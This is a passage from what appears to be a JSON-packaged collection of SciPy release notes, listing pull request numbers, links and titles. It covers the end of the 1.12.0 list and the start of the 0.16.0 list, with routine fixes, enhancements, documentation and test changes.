<https://github.com/scipy/scipy/pull/19534>`__: MAINT: get rid of more Python 2 left-overs\n* `19540 <https://github.com/scipy/scipy/pull/19540>`__: DOC: _binomtest.py: Add clearer error messages\n* `19546 <https://github.com/scipy/scipy/pull/19546>`__: MAINT: Fix interpolate.make_smoothing_spline's size validation...\n* `19556 <https://github.com/scipy/scipy/pull/19556>`__: DOC: revert part of bcbb18f / #19533\n* `19558 <https://github.com/scipy/scipy/pull/19558>`__: MAINT: forward port 1.11.4 relnotes\n* `19562 <https://github.com/scipy/scipy/pull/19562>`__: MAINT: Fix typos in Rotation.from_mrp referenced paper\n* `19564 <https://github.com/scipy/scipy/pull/19564>`__: MAINT: Mark in \\`.gitignore\\` the directories instead of their...\n* `19570 <https://github.com/scipy/scipy/pull/19570>`__: DOC: Fixed build instructions in index.rst (#19568)\n* `19574 <https://github.com/scipy/scipy/pull/19574>`__: DOC: update Building from source docs for editable installs\n* `19576 <https://github.com/scipy/scipy/pull/19576>`__: BUG: Use uint32 for cost in NI_WatershedElement\n* `19578 <https://github.com/scipy/scipy/pull/19578>`__: BUG: stats._axis_nan_policy_factory: respect too_small when detecting...\n* `19579 <https://github.com/scipy/scipy/pull/19579>`__: BLD:MAINT:Update dev.py message\n* `19581 <https://github.com/scipy/scipy/pull/19581>`__: BUG: interpolate/ndbspline: fix OOB access for len(tx) != len(ty)...\n* `19583 <https://github.com/scipy/scipy/pull/19583>`__: ENH: Use \\`np.dot\\` to speedup \\`spatial.distance.correlation\\`\n* `19585 <https://github.com/scipy/scipy/pull/19585>`__: DEP: improve deprecation of remaining private modules named without...\n* `19588 <https://github.com/scipy/scipy/pull/19588>`__: BLD:Add missing cstdin include in fast matrix market\n* `19589 <https://github.com/scipy/scipy/pull/19589>`__: ENH: Use \\`np.dot\\` to speedup \\`spatial.distance.hamming\\`\n* `19590 <https://github.com/scipy/scipy/pull/19590>`__: MAINT:special:Add more noexcept to Cython signatures\n* `19591 <https://github.com/scipy/scipy/pull/19591>`__: MAINT: interpolate/RGI: avoid unnecessary validation of data...\n* `19593 <https://github.com/scipy/scipy/pull/19593>`__: Returning NotImplemented in comparisons with sparse arrays\n* `19597 <https://github.com/scipy/scipy/pull/19597>`__: TST: special._sinpi/_cospi: skip failing \\`test_intermediate_overflow\\`\n* `19600 <https://github.com/scipy/scipy/pull/19600>`__: Fix sparse multiply\n* `19601 <https://github.com/scipy/scipy/pull/19601>`__: ENH: Make special C++ implementations work on CUDA (and beyond!)\n* `19603 <https://github.com/scipy/scipy/pull/19603>`__: DOC: doc shim for eig normalization\n* `19604 <https://github.com/scipy/scipy/pull/19604>`__: BUG: fix overflow in stats.boxcox_normmax when method='mle'\n* `19606 <https://github.com/scipy/scipy/pull/19606>`__: MAINT: array types: restrict to boolean & numerical dtypes\n* `19608 <https://github.com/scipy/scipy/pull/19608>`__: MAINT/DOC: refguide-check fixes\n* `19609 <https://github.com/scipy/scipy/pull/19609>`__: MAINT: lint: enable line-length check (package-wide)\n* `19611 <https://github.com/scipy/scipy/pull/19611>`__: DOC: clarify interpolator termionolgy\n* `19613 <https://github.com/scipy/scipy/pull/19613>`__: MAINT: Added clang-format formatting for special C++ files\n* `19617 <https://github.com/scipy/scipy/pull/19617>`__: fix numerical stability\n* `19618 <https://github.com/scipy/scipy/pull/19618>`__: MAINT: qmc permutations win type\n* `19622 <https://github.com/scipy/scipy/pull/19622>`__: CI: undo cython==0.29.35 pin for the 32-bit Linux job, remove...\n* `19623 <https://github.com/scipy/scipy/pull/19623>`__: MAINT: lint: enable \\`stacklevel\\` warnings check\n* `19624 <https://github.com/scipy/scipy/pull/19624>`__: MAINT/TST: _lib: use value instead of deprecated s\n* `19626 <https://github.com/scipy/scipy/pull/19626>`__: MAINT: more SciPy windows int shims\n* `19628 <https://github.com/scipy/scipy/pull/19628>`__: DOC: 1.12.0 release notes\n* `19635 <https://github.com/scipy/scipy/pull/19635>`__: MAINT: simplify Nakagami mean calculation\n* `19637 <https://github.com/scipy/scipy/pull/19637>`__: DOC: Clarify integration error bound in \\`integrate\\` tutorial\n* `19648 <https://github.com/scipy/scipy/pull/19648>`__: MAINT: simplify chi distribution mean calculation\n* `19651 <https://github.com/scipy/scipy/pull/19651>`__: MAINT: stats.entropy: silence mypy\n* `19656 <https://github.com/scipy/scipy/pull/19656>`__: BUG: Remove unnecessary incref on unrelated type\n* `19658 <https://github.com/scipy/scipy/pull/19658>`__: MAINT: git blame ignores for lint clean-ups\n* `19660 <https://github.com/scipy/scipy/pull/19660>`__: STY: special: use indent width of 4 in clang-format\n* `19661 <https://github.com/scipy/scipy/pull/19661>`__: CI: fix pre-release job by correct version pin for scipy-openblas32\n* `19670 <https://github.com/scipy/scipy/pull/19670>`__: MAINT: version bounds for 1.12.0rc1\n* `19677 <https://github.com/scipy/scipy/pull/19677>`__: DOC: array types: mention partial support in \\`special\\`\n* `19686 <https://github.com/scipy/scipy/pull/19686>`__: TST: fix incorrect signal.sosfilt tests\n* `19690 <https://github.com/scipy/scipy/pull/19690>`__: BLD: avoid fast-math for oneAPI compilers, fix up handling of...\n* `19691 <https://github.com/scipy/scipy/pull/19691>`__: BUG: fix negative overflow in stats.boxcox_normmax\n* `19693 <https://github.com/scipy/scipy/pull/19693>`__: BUG: Prevent mutation of \\`w\\` parameter in \\`spatial.distance.\\*\\`\n* `19702 <https://github.com/scipy/scipy/pull/19702>`__: DEP: Adopt \\`\\*tol\\` deprecations also for \\`gcrotmk/lgmres/minres/tfqmr\\`\n* `19709 <https://github.com/scipy/scipy/pull/19709>`__: MAINT: Cumulative simpson follow-up comments\n* `19735 <https://github.com/scipy/scipy/pull/19735>`__: DOC: update release notes with all deprecations for 1.12 release\n* `19748 <https://github.com/scipy/scipy/pull/19748>`__: TST: skip RGI(..., method=\"pchip\" for complex values)\n* `19751 <https://github.com/scipy/scipy/pull/19751>`__: BUG: Make FMM classes \\`py::module_local\\` (fix for 1.12RC)\n* `19761 <https://github.com/scipy/scipy/pull/19761>`__: MAINT: Avoid use of aligned_alloc in pocketfft on windows\n* `19779 <https://github.com/scipy/scipy/pull/19779>`__: BUG: Fix \\`nbinom.logcdf\\` for invalid input\n* `19785 <https://github.com/scipy/scipy/pull/19785>`__: BUG: support sparse Hessian in \\`Newton-CG\\`\n* `19797 <https://github.com/scipy/scipy/pull/19797>`__: MAINT: 1.12.0rc2 prep\n* `19800 <https://github.com/scipy/scipy/pull/19800>`__: TST: loosen tolerances for tests that fail otherwise on windows+MKL\n* `19806 <https://github.com/scipy/scipy/pull/19806>`__: TST: fix compatibility with pytest 8\n* `19830 <https://github.com/scipy/scipy/pull/19830>`__: REL: bump copyright to 2024\n* `19842 <https://github.com/scipy/scipy/pull/19842>`__: TST: move reference data for test_real_transforms to a fixture\n* `19859 <https://github.com/scipy/scipy/pull/19859>`__: BLD: improve scipy-openblas dependency check\n* `19877 <https://github.com/scipy/scipy/pull/19877>`__: DOC: 1.12 release notes tweaks\n* `19881 <https://github.com/scipy/scipy/pull/19881>`__: Revert \"ENH: stats.wasserstein_distance: multivariate Wasserstein...\n* `19892 <https://github.com/scipy/scipy/pull/19892>`__: DEP: extend some announced deprecations due to out-of-band 1.13...\n* `19903 <https://github.com/scipy/scipy/pull/19903>`__: DEP: reflect extended deprecations also in release notes\n* `19910 <https://github.com/scipy/scipy/pull/19910>`__: BLD: ensure the name of the installed \\`scipy\\` package is lower-case\n\n\n==========================\n", "0.16.0": "------------------------\n\n- `3116 <https://github.com/scipy/scipy/pull/3116>`__: sparse: enhancements for DIA format\n- `3157 <https://github.com/scipy/scipy/pull/3157>`__: ENH: linalg: add the function 'solve_circulant' for solving a...\n- `3442 <https://github.com/scipy/scipy/pull/3442>`__: ENH: signal: Add Gustafsson's method as an option for the filtfilt...\n- `3679 <https://github.com/scipy/scipy/pull/3679>`__: WIP: fix sporadic slepian failures\n- `3680 <https://github.com/scipy/scipy/pull/3680>`__: Some cleanups in stats\n- `3717 <https://github.com/scipy/scipy/pull/3717>`__: ENH: Add second-order sections filtering\n- `3741 <https://github.com/scipy/scipy/pull/3741>`__: Dltisys changes\n- `3956 <https://github.com/scipy/scipy/pull/3956>`__: add note to scipy.signal.resample about prime sample numbers\n- `3980 <https://github.com/scipy/scipy/pull/3980>`__: Add check_finite flag to UnivariateSpline\n- `3996 <https://github.com/scipy/scipy/pull/3996>`__: MAINT: stricter linalg argument checking\n- `4001 <https://github.com/scipy/scipy/pull/4001>`__: BUG: numerical precision in dirichlet\n- `4012 <https://github.com/scipy/scipy/pull/4012>`__: ENH: linalg: Add a function to compute the inverse of a Pascal...\n- `4021 <https://github.com/scipy/scipy/pull/4021>`__: ENH: Cython api for lapack and blas\n- `4089 <https://github.com/scipy/scipy/pull/4089>`__: Fixes for various PEP8 issues.\n- `4116 <https://github.com/scipy/scipy/pull/4116>`__: MAINT: fitpack: trim down compiler warnings (unused labels, variables)\n- `4129 <https://github.com/scipy/scipy/pull/4129>`__: ENH: stats: add a random_state property to distributions\n- `4135 <https://github.com/scipy/scipy/pull/4135>`__: ENH: Add Wishart and inverse Wishart distributions\n- `4195 <https://github.com/scipy/scipy/pull/4195>`__: improve the interpolate docs\n- `4200 <https://github.com/scipy/scipy/pull/4200>`__: ENH: Add t-test from descriptive stats function.\n- `4202 <https://github.com/scipy/scipy/pull/4202>`__: Dendrogram threshold color\n- `4205 <https://github.com/scipy/scipy/pull/4205>`__: BLD: fix a number of Bento build warnings.\n- `4211 <https://github.com/scipy/scipy/pull/4211>`__: add an ufunc for the inverse Box-Cox transfrom\n- `4212 <https://github.com/scipy/scipy/pull/4212>`__: MRG:fix for gh-4208\n- `4213 <https://github.com/scipy/scipy/pull/4213>`__: ENH: specific warning if matlab file is empty\n- `4215 <https://github.com/scipy/scipy/pull/4215>`__: Issue #4209: splprep documentation updated to reflect dimensional...\n- `4219 <https://github.com/scipy/scipy/pull/4219>`__: DOC: silence several Sphinx warnings when building the docs\n- `4223 <https://github.com/scipy/scipy/pull/4223>`__: MAINT: remove two redundant lines of code\n- `4226 <https://github.com/scipy/scipy/pull/4226>`__: try forcing the numpy rebuild with relaxed strides\n- `4228 <https://github.com/scipy/scipy/pull/4228>`__: BLD: some updates to Bento config files and docs. Closes gh-3978.\n- `4232 <https://github.com/scipy/scipy/pull/4232>`__: wrong references in the docs\n- `4242 <https://github.com/scipy/scipy/pull/4242>`__: DOC: change example sample spacing\n- `4245 <https://github.com/scipy/scipy/pull/4245>`__: Arff fixes\n- `4246 <https://github.com/scipy/scipy/pull/4246>`__: MAINT: C fixes\n- `4247 <https://github.com/scipy/scipy/pull/4247>`__: MAINT: remove some unused code\n- `4249 <https://github.com/scipy/scipy/pull/4249>`__: Add routines for updating QR decompositions\n- `4250 <https://github.com/scipy/scipy/pull/4250>`__: MAINT: Some pyflakes-driven cleanup in linalg and sparse\n- `4252 <https://github.com/scipy/scipy/pull/4252>`__: MAINT trim away >10 kLOC of generated C code\n- `4253 <https://github.com/scipy/scipy/pull/4253>`__: TST: stop shadowing ellip* tests vs boost data\n- `4254 <https://github.com/scipy/scipy/pull/4254>`__: MAINT: special: use NPY_PI, not M_PI\n- `4255 <https://github.com/scipy/scipy/pull/4255>`__: DOC: INSTALL: use Py3-compatible print syntax, and don't mention...\n- `4256 <https://github.com/scipy/scipy/pull/4256>`__: ENH: spatial: reimplement cdist_cosine using np.dot\n- `4258 <https://github.com/scipy/scipy/pull/4258>`__: BUG: io.arff #4429 2088\n- `4261 <https://github.com/scipy/scipy/pull/4261>`__: MAINT: signal: PEP8 and related style clean up.\n- `4262 <https://github.com/scipy/scipy/pull/4262>`__: BUG: newton_krylov() was ignoring norm_tol argument, closes #4259\n- `4263 <https://github.com/scipy/scipy/pull/4263>`__: MAINT: clean up test noise and optimize tests for docstrings...\n- `4266 <https://github.com/scipy/scipy/pull/4266>`__: MAINT: io: Give an informative error when attempting to read...\n- `4268 <https://github.com/scipy/scipy/pull/4268>`__: MAINT: fftpack benchmark integer division vs true division\n- `4269 <https://github.com/scipy/scipy/pull/4269>`__: MAINT: avoid shadowing the eigvals function\n- `4272 <https://github.com/scipy/scipy/pull/4272>`__: BUG: sparse: Fix bench_sparse.py\n- `4276 <https://github.com/scipy/scipy/pull/4276>`__: DOC: remove confusing parts of the documentation related to writing...\n- `4281 <https://github.com/scipy/scipy/pull/4281>`__: Sparse matrix multiplication: only convert array if needed (with...\n- `4284 <https://github.com/scipy/scipy/pull/4284>`__: BUG: integrate: odeint crashed when the integration time was...\n- `4286 <https://github.com/scipy/scipy/pull/4286>`__: MRG: fix matlab output type of logical array\n- `4287 <https://github.com/scipy/scipy/pull/4287>`__: DEP: deprecate stats.pdf_fromgamma. Closes gh-699.\n- `4291 <https://github.com/scipy/scipy/pull/4291>`__: DOC: linalg: fix layout in cholesky_banded docstring\n- `4292 <https://github.com/scipy/scipy/pull/4292>`__: BUG: allow empty dict as proxy for empty struct\n- `4293 <https://github.com/scipy/scipy/pull/4293>`__: MAINT: != -> not_equal in hamming distance implementation\n- `4295 <https://github.com/scipy/scipy/pull/4295>`__: Pole placement\n- `4296 <https://github.com/scipy/scipy/pull/4296>`__: MAINT: some cleanups in tests of several modules\n- `4302 <https://github.com/scipy/scipy/pull/4302>`__: ENH: Solve toeplitz linear systems\n- `4306 <https://github.com/scipy/scipy/pull/4306>`__: Add benchmark for conjugate gradient solver.\n- `4307 <https://github.com/scipy/scipy/pull/4307>`__: BLD: PEP 440\n- `4310 <https://github.com/scipy/scipy/pull/4310>`__: BUG: make stats.geom.logpmf(1,1) return 0.0 instead of nan\n- `4311 <https://github.com/scipy/scipy/pull/4311>`__: TST: restore a test that uses slogdet now that we have dropped...\n- `4313 <https://github.com/scipy/scipy/pull/4313>`__: Some minor fixes for stats.wishart addition.\n- `4315 <https://github.com/scipy/scipy/pull/4315>`__: MAINT: drop numpy 1.5 compatibility code in sparse matrix tests\n- `4318 <https://github.com/scipy/scipy/pull/4318>`__: ENH: Add random_state to multivariate distributions\n- `4319 <https://github.com/scipy/scipy/pull/4319>`__: MAINT: fix hamming distance regression for exotic arrays, with...\n- `4320 <https://github.com/scipy/scipy/pull/4320>`__: TST: a few changes like self.assertTrue(x == y, message) -> assert_equal(x,...\n- `4321 <https://github.com/scipy/scipy/pull/4321>`__: TST: more changes like self.assertTrue(x == y, message) -> assert_equal(x,...\n- `4322 <https://github.com/scipy/scipy/pull/4322>`__: TST: in test_signaltools, changes like self.assertTrue(x == y,...\n- `4323 <https://github.com/scipy/scipy/pull/4323>`__: MAINT: clean up benchmarks so they can all be run as single files.\n- `4324 <https://github.com/scipy/scipy/pull/4324>`__: Add more detailed committer guidelines, update MAINTAINERS.txt\n- `4326 <https://github.com/scipy/scipy/pull/4326>`__: TST: use numpy.testing in test_hierarchy.py\n- `4329 <https://github.com/scipy/scipy/pull/4329>`__: MAINT: stats: rename check_random_state test function\n- `4330 <https://github.com/scipy/scipy/pull/4330>`__: Update distance tests\n- `4333 <https://github.com/scipy/scipy/pull/4333>`__: MAINT: import comb, factorial from scipy.special, not scipy.misc\n- `4338 <https://github.com/scipy/scipy/pull/4338>`__: TST: more conversions from nose to numpy.testing\n- `4339 <https://github.com/scipy/scipy/pull/4339>`__: MAINT: remove the deprecated all_mat function from special_matrices.py\n- `4340 <https://github.com/scipy/scipy/pull/4340>`__: add several features to frozen distributions\n- `4344 <https://github.com/scipy/scipy/pull/4344>`__: BUG: Fix/test invalid lwork param in qr\n- `4345 <https://github.com/scipy/scipy/pull/4345>`__: Fix test noise visible with Python 3.x\n- `4347 <https://github.com/scipy/scipy/pull/4347>`__: Remove deprecated blas/lapack imports, rename lib to _lib\n- `4349 <https://github.com/scipy/scipy/pull/4349>`__: DOC: add a nontrivial example to stats.binned_statistic.\n- `4350 <https://github.com/scipy/scipy/pull/4350>`__: MAINT: remove optimize.anneal for 0.16.0 (was deprecated in 0.14.0).\n- `4351 <https://github.com/scipy/scipy/pull/4351>`__: MAINT: fix usage of deprecated Numpy C API in optimize...\n- `4352 <https://github.com/scipy/scipy/pull/4352>`__: MAINT: fix a number of special test failures\n- `4353 <https://github.com/scipy/scipy/pull/4353>`__: implement cdf for betaprime distribution\n- `4357 <https://github.com/scipy/scipy/pull/4357>`__: BUG: piecewise polynomial antiderivative\n- `4358 <https://github.com/scipy/scipy/pull/4358>`__: BUG: integrate: fix handling of banded Jacobians in odeint, plus...\n- `4359 <https://github.com/scipy/scipy/pull/4359>`__: MAINT: remove a code path taken for Python version < 2.5\n- `4360 <https://github.com/scipy/scipy/pull/4360>`__: MAINT: stats.mstats: Remove some unused variables (thanks, pyflakes).\n- `4362 <https://github.com/scipy/scipy/pull/4362>`__: Removed erroneous reference to smoothing parameter #4072\n- `4363 <https://github.com/scipy/scipy/pull/4363>`__: MAINT: interpolate: clean up in fitpack.py\n- `4364 <https://github.com/scipy/scipy/pull/4364>`__: MAINT: lib: don't export \"partial\" from decorator\n- `4365 <https://github.com/scipy/scipy/pull/4365>`__: svdvals now returns a length-0 sequence of singular values given...\n- `4367 <https://github.com/scipy/scipy/pull/4367>`__: DOC: slightly improve TeX rendering of wishart/invwishart docstring\n- `4373 <https://github.com/scipy/scipy/pull/4373>`__: ENH: wrap gtsv and ptsv for solve_banded and solveh_banded.\n- `4374 <https://github.com/scipy/scipy/pull/4374>`__: ENH: Enhancements to spatial.cKDTree\n- `4376 <https://github.com/scipy/scipy/pull/4376>`__: BF: fix reading off-spec matlab logical sparse\n- `4377 <https://github.com/scipy/scipy/pull/4377>`__: MAINT: integrate: Clean up some Fortran test code.\n- `4378 <https://github.com/scipy/scipy/pull/4378>`__: MAINT: fix usage of deprecated Numpy C API in signal\n- `4380 <https://github.com/scipy/scipy/pull/4380>`__: MAINT: scipy.optimize, removing further anneal references\n- `4381 <https://github.com/scipy/scipy/pull/4381>`__: ENH: Make DCT and DST accept int and complex types like fft\n- `4392 <https://github.com/scipy/scipy/pull/4392>`__: ENH: optimize: add DF-SANE nonlinear derivative-free solver\n- `4394 <https://github.com/scipy/scipy/pull/4394>`__: Make reordering algorithms 64-bit clean\n- `4396 <https://github.com/scipy/scipy/pull/4396>`__: BUG: bundle cblas.h in Accelerate ABI wrappers to enable compilation...\n- `4398 <https://github.com/scipy/scipy/pull/4398>`__: FIX pdist bug where wminkowski's w.dtype != double\n- `4402 <https://github.com/scipy/scipy/pull/4402>`__: BUG: fix stat.hypergeom argcheck\n- `4404 <https://github.com/scipy/scipy/pull/4404>`__: MAINT: Fill in the full symmetric squareform in the C loop\n- `4405 <https://github.com/scipy/scipy/pull/4405>`__: BUG: avoid X += X.T (refs #4401)\n- `4407 <https://github.com/scipy/scipy/pull/4407>`__: improved accuracy of gompertz distribution for small x\n- `4414 <https://github.com/scipy/scipy/pull/4414>`__: DOC:fix error in scipy.signal.cwt documentation.\n- `4415 <https://github.com/scipy/scipy/pull/4415>`__: ENH: Improve accuracy of lomax for small x.\n- `4416 <https://github.com/scipy/scipy/pull/4416>`__: DOC: correct a parameter name in docstring of SuperLU.solve....\n- `4419 <https://github.com/scipy/scipy/pull/4419>`__: Restore scipy.linalg.calc_lwork also in master\n- `4420 <https://github.com/scipy/scipy/pull/4420>`__: fix a performance issue with a sparse solver\n- `4423 <https://github.com/scipy/scipy/pull/4423>`__: ENH: improve rayleigh accuracy for large x.\n- `4424 <https://github.com/scipy/scipy/pull/4424>`__: BUG: optimize.minimize: fix overflow issue with integer x0 input.\n- `4425 <https://github.com/scipy/scipy/pull/4425>`__: ENH: Improve accuracy of truncexpon for small x\n- `4426 <https://github.com/scipy/scipy/pull/4426>`__: ENH: improve rayleigh accuracy for large x.\n- `4427 <https://github.com/scipy/scipy/pull/4427>`__: MAINT: optimize: cleanup of TNC code\n- `4429 <https://github.com/scipy/scipy/pull/4429>`__: BLD: fix build failure with numpy 1.7.x and 1.8.x.\n- `4430 <https://github.com/scipy/scipy/pull/4430>`__: BUG: fix a sparse.dok_matrix set/get copy-paste bug\n- `4433 <https://github.com/scipy/scipy/pull/4433>`__: Update _minimize.py\n- `4435 <https://github.com/scipy/scipy/pull/4435>`__: ENH: release GIL around batch distance computations\n- `4436 <https://github.com/scipy/scipy/pull/4436>`__: Fixed incomplete documentation for spsolve\n- `4439 <https://github.com/scipy/scipy/pull/4439>`__: MAINT: integrate: Some clean up in the tests.\n- `4440 <https://github.com/scipy/scipy/pull/4440>`__: Fast permutation t-test\n- `4442 <https://github.com/scipy/scipy/pull/4442>`__: DOC: optimize: fix wrong result in docstring\n- `4447 <https://github.com/scipy/scipy/pull/4447>`__: DOC: signal: Some additional documentation to go along with the...\n- `4448 <https://github.com/scipy/scipy/pull/4448>`__: DOC: tweak the docstring of lapack.linalg module\n- `4449 <https://github.com/scipy/scipy/pull/4449>`__: fix a typo in the expit docstring\n- `4451 <https://github.com/scipy/scipy/pull/4451>`__: ENH: vectorize distance loops with gcc\n- `4456 <https://github.com/scipy/scipy/pull/4456>`__: MAINT: don't fail large data tests on MemoryError\n- `4461 <https://github.com/scipy/scipy/pull/4461>`__: CI: use travis_retry to deal with network timeouts\n- `4462 <https://github.com/scipy/scipy/pull/4462>`__: DOC: rationalize minimize() et al. documentation\n- `4470 <https://github.com/scipy/scipy/pull/4470>`__: MAINT: sparse: inherit dok_matrix.toarray from spmatrix\n- `4473 <https://github.com/scipy/scipy/pull/4473>`__: BUG: signal: Fix validation of the zi shape in sosfilt.\n- `4475 <https://github.com/scipy/scipy/pull/4475>`__: BLD: setup.py: update min numpy version and support \"setup.py...\n- `4481 <https://github.com/scipy/scipy/pull/4481>`__: ENH: add a new linalg special matrix: the Helmert matrix\n- `4485 <https://github.com/scipy/scipy/pull/4485>`__: MRG: some changes to allow reading bad mat files\n- `4490 <https://github.com/scipy/scipy/pull/4490>`__: [ENH] linalg.hessenberg: use orghr - rebase\n- `4491 <https://github.com/scipy/scipy/pull/4491>`__: ENH: linalg: Adding wrapper for potentially useful LAPACK function...\n- `4493 <https://github.com/scipy/scipy/pull/4493>`__: BENCH: the solve_toeplitz benchmark used outdated syntax and...\n- `4494 <https://github.com/scipy/scipy/pull/4494>`__: MAINT: stats: remove duplicated code\n- `4496 <https://github.com/scipy/scipy/pull/4496>`__: References added for watershed_ift algorithm\n- `4499 <https://github.com/scipy/scipy/pull/4499>`__: DOC: reshuffle stats distributions documentation\n- `4501 <https://github.com/scipy/scipy/pull/4501>`__: Replace benchmark suite with airspeed velocity\n- `4502 <https://github.com/scipy/scipy/pull/4502>`__: SLSQP should strictly satisfy bound constraints\n- `4503 <https://github.com/scipy/scipy/pull/4503>`__: DOC: forward port 0.15.x release notes and update author name...\n- `4504 <https://github.com/scipy/scipy/pull/4504>`__: ENH: option to avoid computing possibly unused svd matrix\n- `4505 <https://github.com/scipy/scipy/pull/4505>`__: Rebase of PR 3303 (sparse matrix norms)\n- `4507 <https://github.com/scipy/scipy/pull/4507>`__: MAINT: fix lobpcg performance regression\n- `4509 <https://github.com/scipy/scipy/pull/4509>`__: DOC: sparse: replace dead link\n- `4511 <https://github.com/scipy/scipy/pull/4511>`__: Fixed differential evolution bug\n- `4512 <https://github.com/scipy/scipy/pull/4512>`__: Change to fully PEP440 compliant dev version numbers (always...\n- `4525 <https://github.com/scipy/scipy/pull/4525>`__: made tiny style corrections (pep8)\n- `4533 <https://github.com/scipy/scipy/pull/4533>`__: Add exponentially modified gaussian distribution (scipy.stats.expongauss)\n- `4534 <https://github.com/scipy/scipy/pull/4534>`__: MAINT: benchmarks: make benchmark suite importable on all scipy...\n- `4535 <https://github.com/scipy/scipy/pull/4535>`__: BUG: Changed zip() to list(zip()) so that it could work in Python...\n- `4536 <https://github.com/scipy/scipy/pull/4536>`__: Follow up to pr 4348 (exponential window)\n- `4540 <https://github.com/scipy/scipy/pull/4540>`__: ENH: spatial: Add procrustes analysis\n- `4541 <https://github.com/scipy/scipy/pull/4541>`__: Bench fixes\n- `4542 <https://github.com/scipy/scipy/pull/4542>`__: TST: NumpyVersion dev -> dev0\n- `4543 <https://github.com/scipy/scipy/pull/4543>`__: BUG: Overflow in savgol_coeffs\n- `4544 <https://github.com/scipy/scipy/pull/4544>`__: pep8 fixes for stats\n- `4546 <https://github.com/scipy/scipy/pull/4546>`__: MAINT: use reduction axis arguments in one-norm estimation\n- `4549 <https://github.com/scipy/scipy/pull/4549>`__: ENH : Added group_delay to scipy.signal\n- `4553 <https://github.com/scipy/scipy/pull/4553>`__: ENH: Significantly faster moment function\n- `4556 <https://github.com/scipy/scipy/pull/4556>`__: DOC: document the changes of the sparse.linalg.svds (optional...\n- `4559 <https://github.com/scipy/scipy/pull/4559>`__: DOC: stats: describe loc and scale parameters in the docstring...\n- `4563 <https://github.com/scipy/scipy/pull/4563>`__: ENH: rewrite of stats.ppcc_plot\n- `4564 <https://github.com/scipy/scipy/pull/4564>`__: Be more (or less) forgiving when user passes +-inf instead of...\n- `4566 <https://github.com/scipy/scipy/pull/4566>`__: DEP: remove a bunch of deprecated function from scipy.stats,...\n- `4570 <https://github.com/scipy/scipy/pull/4570>`__: MNT: Suppress LineSearchWarning's in scipy.optimize tests\n- `4572 <https://github.com/scipy/scipy/pull/4572>`__: ENH: Extract inverse hessian information from L-BFGS-B\n- `4576 <https://github.com/scipy/scipy/pull/4576>`__: ENH: Split signal.lti into subclasses, part of #2912\n- `4578 <https://github.com/scipy/scipy/pull/4578>`__: MNT: Reconcile docstrings and function signatures\n- `4581 <https://github.com/scipy/scipy/pull/4581>`__: Fix build with Intel MKL on Linux\n- `4583 <https://github.com/scipy/scipy/pull/4583>`__: DOC: optimize: remove references to unused disp kwarg\n- `4584 <https://github.com/scipy/scipy/pull/4584>`__: ENH: scipy.signal - Tukey window\n- `4587 <https://github.com/scipy/scipy/pull/4587>`__: Hermite asymptotic\n- `4593 <https://github.com/scipy/scipy/pull/4593>`__: DOC - add example to RegularGridInterpolator\n- `4595 <https://github.com/scipy/scipy/pull/4595>`__: DOC: Fix erroneous latex characters in tutorial/optimize.\n- `4600 <https://github.com/scipy/scipy/pull/4600>`__: Add return codes to optimize.tnc docs\n- `4603 <https://github.com/scipy/scipy/pull/4603>`__: ENH: Wrap LAPACK ``*lange`` functions for matrix norms\n- `4604 <https://github.com/scipy/scipy/pull/4604>`__: scipy.stats: generalized normal distribution\n- `4609 <https://github.com/scipy/scipy/pull/4609>`__: MAINT: interpolate: fix a few inconsistencies between docstrings...\n- `4610 <https://github.com/scipy/scipy/pull/4610>`__: MAINT: make runtest.py --bench-compare use asv continuous and...\n- `4611 <https://github.com/scipy/scipy/pull/4611>`__: DOC: stats: explain rice scaling; add a note to the tutorial...\n- `4614 <https://github.com/scipy/scipy/pull/4614>`__: BUG: lfilter, the size of zi was not checked correctly for nd...\n- `4617 <https://github.com/scipy/scipy/pull/4617>`__: MAINT: integrate: Clean the C code behind odeint.\n- `4618 <https://github.com/scipy/scipy/pull/4618>`__: FIX: Raise error when window length != data length\n- `4619 <https://github.com/scipy/scipy/pull/4619>`__: Issue #4550: `scipy.stats.mode` - UnboundLocalError on empty...\n- `4620 <https://github.com/scipy/scipy/pull/4620>`__: Fixed a problem (#4590) with svds accepting wrong eigenvalue...\n- `4621 <https://github.com/scipy/scipy/pull/4621>`__: Speed up special.ai_zeros/bi_zeros by 10x\n- `4623 <https://github.com/scipy/scipy/pull/4623>`__: MAINT: some tweaks to spatial.procrustes (private file, html...\n- `4628 <https://github.com/scipy/scipy/pull/4628>`__: Speed up signal.lfilter and add a convolution path for FIR filters\n- `4629 <https://github.com/scipy/scipy/pull/4629>`__: Bug: integrate.nquad; resolve issue #4599\n- `4631 <https://github.com/scipy/scipy/pull/4631>`__: MAINT: integrate: Remove unused variables in a Fortran test function.\n- `4633 <https://github.com/scipy/scipy/pull/4633>`__: MAINT: Fix convergence message for remez\n- `4635 <https://github.com/scipy/scipy/pull/4635>`__: PEP8: indentation (so that pep8 bot does not complain)\n- `4637 <https://github.com/scipy/scipy/pull/4637>`__: MAINT: generalize a sign function to do the right thing for complex...\n- `4639 <https://github.com/scipy/scipy/pull/4639>`__: Amended typo in apple_sgemv_fix.c\n- `4642 <https://github.com/scipy/scipy/pull/4642>`__: MAINT: use lapack for scipy.linalg.norm\n- `4643 <https://github.com/scipy/scipy/pull/4643>`__: RBF default epsilon too large 2020\n- `4646 <https://github.com/scipy/scipy/pull/4646>`__: Added atleast_1d around poly in invres and invresz\n- `4647 <https://github.com/scipy/scipy/pull/4647>`__: fix doc pdf build\n- `4648 <https://github.com/scipy/scipy/pull/4648>`__: BUG: Fixes #4408: Vector-valued constraints in minimize() et...\n- `4649 <https://github.com/scipy/scipy/pull/4649>`__: Vonmisesfix\n- `4650 <https://github.com/scipy/scipy/pull/4650>`__: Signal example clean up in Tukey and place_poles\n- `4652 <https://github.com/scipy/scipy/pull/4652>`__: DOC: Fix the error in convolve for same mode\n- `4653 <https://github.com/scipy/scipy/pull/4653>`__: improve erf performance\n- `4655 <https://github.com/scipy/scipy/pull/4655>`__: DEP: deprecate scipy.stats.histogram2 in favour of np.histogram2d\n- `4656 <https://github.com/scipy/scipy/pull/4656>`__: DEP: deprecate scipy.stats.signaltonoise\n- `4660 <https://github.com/scipy/scipy/pull/4660>`__: Avoid extra copy for sparse compressed [:, seq] and [seq, :]...\n- `4661 <https://github.com/scipy/scipy/pull/4661>`__: Clean, rebase of #4478, adding ?gelsy and ?gelsd wrappers\n- `4662 <https://github.com/scipy/scipy/pull/4662>`__: MAINT: Correct odeint messages\n- `4664 <https://github.com/scipy/scipy/pull/4664>`__: Update _monotone.py\n- `4672 <https://github.com/scipy/scipy/pull/4672>`__: fix behavior of scipy.linalg.block_diag for empty input\n- `4675 <https://github.com/scipy/scipy/pull/4675>`__: Fix lsim\n- 